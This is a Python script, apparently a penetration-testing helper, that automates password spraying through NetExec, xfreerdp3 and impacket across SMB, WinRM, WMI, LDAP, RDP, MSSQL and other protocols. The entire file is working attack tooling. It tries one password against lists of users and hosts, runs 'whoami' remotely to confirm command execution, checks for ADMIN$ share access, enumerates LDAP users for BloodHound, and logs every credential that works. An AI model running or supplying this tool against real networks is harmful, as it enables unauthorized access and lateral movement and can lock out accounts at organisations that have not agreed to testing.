#!/usr/bin/env python3
import argparse
import subprocess
import sys
import time
from pathlib import Path
from datetime import datetime

# =====================
# ANSI COLORS
# =====================
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

ALL_PROTOCOLS = [
    "ftp", "smb", "ldap", "winrm", "nfs",
    "vnc", "mssql", "ssh", "rdp", "wmi",
]

# =====================
# HELPERS
# =====================
def load_list(value):
    if not value:
        return []
    if Path(value).is_file():
        return [line.strip() for line in open(value) if line.strip()]
    return [value]

def run_nxc(proto, target, user, password, local_auth):
    cmd = ["nxc", proto, target, "-u", user, "-p", password]
    if local_auth:
        cmd.append("--local-auth")

    print(f"[+] Running: {' '.join(cmd)}")

    return subprocess.run(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

# smarter success detection
def extract_success(output):
    if "[+]" in output:
        return True
    return False

def is_pwned(output):
    return "Pwn3d!" in output

# =====================
# VALIDATION LOGIC
# =====================
def validate_access(proto, target, user, password):
    try:
        # -----------------
        # SMB
        # -----------------
        if proto == "smb":
            cmd = ["nxc", "smb", target, "-u", user, "-p", password, "--shares"]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if "ADMIN$" in result.stdout:
                return True, "ADMIN$ access confirmed"

            return False, "SMB auth valid but no admin access"

        # -----------------
        # WINRM
        # -----------------
        elif proto == "winrm":
            cmd = ["nxc", "winrm", target, "-u", user, "-p", password, "-x", "whoami"]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if user.lower() in result.stdout.lower():
                return True, "Command execution confirmed"

            return False, "WinRM auth valid but no execution"

        # -----------------
        # WMI
        # -----------------
        elif proto == "wmi":
            cmd = ["nxc", "wmi", target, "-u", user, "-p", password, "-x", "whoami"]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if user.lower() in result.stdout.lower():
                return True, "WMI execution confirmed"

            return False, "WMI auth valid but no execution"

        # -----------------
        # LDAP
        # -----------------
        elif proto == "ldap":
            cmd = ["nxc", "ldap", target, "-u", user, "-p", password, "--users"]
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if "CN=" in result.stdout or "userPrincipalName" in result.stdout:
                return True, "LDAP bind + enumeration confirmed"

            return False, "LDAP bind valid (use for BloodHound)"

        # -----------------
        # RDP
        # -----------------
        elif proto == "rdp":
            cmd = [
                "xfreerdp3",
                f"/u:{user}",
                f"/p:{password}",
                f"/v:{target}",
                "/cert:ignore",
                "+auth-only"
            ]

            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if result.returncode == 0:
                return True, "RDP login confirmed"

            return False, "RDP auth valid but interactive login blocked (likely NLA/policy)"

        # -----------------
        # MSSQL
        # -----------------
        elif proto == "mssql":
            cmd = [
                "impacket-mssqlclient",
                f"{user}:{password}@{target}",
                "-windows-auth"
            ]

            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            output = result.stdout + result.stderr

            if "Login failed" not in output:
                return True, "MSSQL login confirmed (Windows auth)"

            return False, "MSSQL auth failed"

    except subprocess.TimeoutExpired:
        return False, "Validation timeout"

    except Exception as e:
        return False, f"Validation error: {e}"

    return False, "No confirmed access"

def explain_failure(output):
    explanations = []

    if "STATUS_LOGON_FAILURE" in output:
        explanations.append("Invalid credentials")

    if "STATUS_ACCOUNT_LOCKED_OUT" in output:
        explanations.append("Account locked out")

    if "Connection refused" in output:
        explanations.append("Service not reachable")

    return explanations

# =====================
# MAIN
# =====================
def main():
    parser = argparse.ArgumentParser(
        description="NetExec multi-protocol password spraying helper (v4)"
    )

    parser.add_argument("protocols", help="Comma-separated protocols or 'all'")
    parser.add_argument("target", help="Target IP or file")
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-U", "--userfile", help="File of usernames")
    parser.add_argument("-p", "--password", required=True)

    parser.add_argument("--local-auth", action="store_true")
    parser.add_argument("--delay", type=int, default=0)
    parser.add_argument("--explain", action="store_true")
    parser.add_argument("--no-color", action="store_true")

    parser.add_argument("--validate", action="store_true",
                        help="Validate real access")
    parser.add_argument("--only-access", action="store_true",
                        help="Only show confirmed access")

    args = parser.parse_args()

    global GREEN, YELLOW, RED, BOLD, RESET
    if args.no_color:
        GREEN = YELLOW = RED = BOLD = RESET = ""

    if not args.user and not args.userfile:
        print("[-] Must supply -u or -U")
        sys.exit(1)

    if args.protocols == "all":
        protocols = ALL_PROTOCOLS
    else:
        protocols = [p.strip() for p in args.protocols.split(",")]

    targets = load_list(args.target)
    users = load_list(args.userfile) if args.userfile else [args.user]

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    logfile = f"spray_{timestamp}.log"

    access_creds = []
    valid_creds = []

    print(f"[+] Users     : {len(users)}")
    print(f"[+] Targets   : {len(targets)}")
    print(f"[+] Protocols : {', '.join(protocols)}")
    print(f"[+] Validation: {args.validate}")
    print(f"[+] Log file  : {logfile}\n")

    for user in users:
        for proto in protocols:
            print(f"{YELLOW}[+] === Protocol: {proto} | User: {user} ==={RESET}")

            for target in targets:
                result = run_nxc(proto, target, user, args.password, args.local_auth)
                output = result.stdout + result.stderr

                with open(logfile, "a") as log:
                    log.write(output + "\n")

                if extract_success(output):
                    entry = f"{proto} {target} {user}:{args.password}"

                    # auto-detect pwned
                    if is_pwned(output):
                        tag = "[ACCESS]"
                        msg = "NetExec Pwn3d! (execution confirmed)"
                        access_creds.append(entry)
                        print(f"{GREEN}{BOLD}{tag} → {entry} ({msg}){RESET}")
                        continue

                    tag = "[VALID]"
                    msg = ""

                    if args.validate:
                        success, msg = validate_access(proto, target, user, args.password)

                        if success:
                            tag = "[ACCESS]"
                            access_creds.append(entry)
                        else:
                            valid_creds.append(entry)
                    else:
                        valid_creds.append(entry)

                    if args.only_access and tag != "[ACCESS]":
                        continue

                    print(f"{GREEN}{BOLD}{tag} → {entry} ({msg}){RESET}")

                elif args.explain:
                    reasons = explain_failure(output)
                    for r in reasons:
                        print(f"[i] {r}")

                if args.delay > 0:
                    time.sleep(args.delay)

    print("\n" + "=" * 60)

    if access_creds:
        print(f"{GREEN}{BOLD}[+] ACCESS ({len(access_creds)}){RESET}")
        for cred in access_creds:
            print(f"{GREEN}  → {cred}{RESET}")

    if valid_creds:
        print(f"{YELLOW}{BOLD}[+] VALID ONLY ({len(valid_creds)}){RESET}")
        for cred in valid_creds:
            print(f"{YELLOW}  → {cred}{RESET}")

    if not access_creds and not valid_creds:
        print(f"{RED}{BOLD}[-] No valid credentials found{RESET}")

    print("=" * 60)


if __name__ == "__main__":
    main()
